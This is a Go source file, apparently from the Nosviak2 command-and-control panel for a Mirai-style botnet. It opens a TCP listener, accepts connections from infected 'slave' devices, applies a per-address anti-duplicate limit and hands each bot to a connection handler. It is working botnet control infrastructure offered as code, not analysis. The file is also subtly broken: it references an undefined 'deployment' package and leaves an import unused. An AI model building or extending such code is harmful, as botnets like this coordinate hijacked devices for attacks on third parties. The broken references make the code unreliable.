package mirai

import (
	"Nosviak2/core/configs"
	"Nosviak2/core/sources/layouts/toml"
	"fmt"
	"log"
	"net"
)

//try to properly start the mirai handler
//this will ensure its done without any errors
func CreateHandler() error { //returns an error if one happened

	//tries to create out tcp server properly
	//this will ensure its done without any errors happening
	server, err := net.Listen("tcp", toml.ConfigurationToml.Mirai.Listener)
	if err != nil { //error handles without any errors happening
		return err //error handles properly
	} else { //allows us to know about the listener starting properly without issues
		fmt.Printf("[slaveMirai_listener] [the slave listener has been started properly] [%s]\r\n", toml.ConfigurationToml.Mirai.Listener)
	}
	

	for {
		//accepts any incoming connections
		//this will ensure its done without any errors
		connection, err := server.Accept() //accepts the conn
		if err != nil { //error handles without any errors
			log.Printf("[Slave] [Error: %s]\r\n", err.Error())
			continue //continues looping properly without issues
		}

		//TODO: change
		//checks for the anti dupe limiter properly
		//this will ensure its done without any errors happening
		if toml.ConfigurationToml.Mirai.MaxDupSupport > 0 && Appears(connection.RemoteAddr().String()) >= toml.ConfigurationToml.Mirai.MaxDupSupport {
			if deployment.DebugMode { //debug mode checking properly
				log.Printf("[Slave] [ANTI-DUPE ALERT] [%s]\r\n", connection.RemoteAddr().String())
			} //prints as debug mode it most likely enabled within this system
			//this will ensure its done without issues
			continue //continues looping properly
		}
		
		//properly serves the slave properly
		//this will ensure its done without any errors
		go ServeConnection(connection)
	}
}